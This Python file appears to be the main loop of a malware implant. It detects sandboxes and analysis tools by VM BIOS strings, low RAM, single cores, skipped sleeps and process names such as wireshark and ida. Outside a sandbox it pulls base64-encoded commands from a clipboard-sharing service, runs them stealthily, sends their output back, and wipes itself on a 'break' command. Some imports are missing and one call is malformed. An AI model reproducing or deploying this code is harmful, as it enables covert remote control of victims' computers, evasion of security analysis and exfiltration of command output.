import re
import os
import psutil
import time
from transporter import *
from wiper import *
from executor import *
import time
from random import randint
import subprocess


def extract_commands(text):
    commands = re.findall(r'"(.*?)"', text)

    for i in range(len(commands)):
        cmd = commands[i]
        decoded = base64.b64decode(cmd.encode()).decode()
        commands[i] = decoded

    return commands

def sandbox_check(verbose=False):
    suspicious = []

    system = platform.system().lower()

    def log(reason):
        if verbose:
            print(f"[!] Sandbox suspicion: {reason}")
        suspicious.append(reason)

    # CPU core check (only flag if 1 core)
    try:
        if os.cpu_count() == 1:
            log("Single CPU core detected")
    except:
        pass

    # Sleep skip detection
    try:
        start = time.time()
        time.sleep(5)
        if time.time() - start < 4.5:
            log("Sleep skipped (likely hooked)")
    except:
        pass

    # Memory size check
    try:
        total_ram_gb = psutil.virtual_memory().total / (1024 ** 3)
        if total_ram_gb < 2:
            log(f"Low RAM: {total_ram_gb:.2f} GB")
    except:
        pass

    # Suspicious processes
    try:
        sandbox_tools = ["vbox", "vmware", "xen", "wireshark", "procmon", "sandbox", "fakenet", "ida", "olly", "tcpview", "procexp"]
        for proc in psutil.process_iter(['name']):
            name = proc.info['name']
            if name and any(tool in name.lower() for tool in sandbox_tools):
                log(f"Suspicious process running: {name}")
                break
    except:
        pass

    # OS-specific checks
    if system == "linux":
        # Uptime
        try:
            with open("/proc/uptime") as f:
                uptime = float(f.readline().split()[0])
                if uptime < 120:
                    log(f"Low uptime: {uptime} seconds")
        except:
            pass

        # Low process count
        try:
            if len(os.listdir("/proc")) < 30:
                log("Low number of processes in /proc")
        except:
            pass

        # BIOS check
        try:
            bios_vendor = open('/sys/class/dmi/id/bios_vendor').read().strip().lower()
            if any(bad in bios_vendor for bad in ["qemu", "virtual", "vmware", "xen", "bochs"]):
                log(f"Suspicious BIOS vendor: {bios_vendor}")
        except:
            pass

    elif system == "windows":
        # BIOS info
        try:
            bios_output = subprocess.check_output("wmic bios get manufacturer", shell=True).decode()
            if any(bad in bios_output.lower() for bad in ["vmware", "virtual", "qemu", "bochs", "xen"]):
                log(f"Suspicious BIOS manufacturer: {bios_output.strip()}")
        except:
            pass


    return len(suspicious) > 0



def main():
    done_cmd = ""

    while True:
        if not sandbox_check(verbose=False):  # Only run if NOT in a sandbox
            clipboard_data = fetch_clipboard_data()
            commands = extract_commands(clipboard_data())

            for command in commands:
                if command == done_cmd:
                    continue

                if command == "break":
                    secure_erase_and_delete_self()

                print(command)
                output = run_command_stealth(command)
                push_to_klipit(output)
                time.sleep(randint(3, 10))

                done_cmd = command
        else:
            time.sleep(randint(10, 60))



if __name__ == '__main__':
    main()
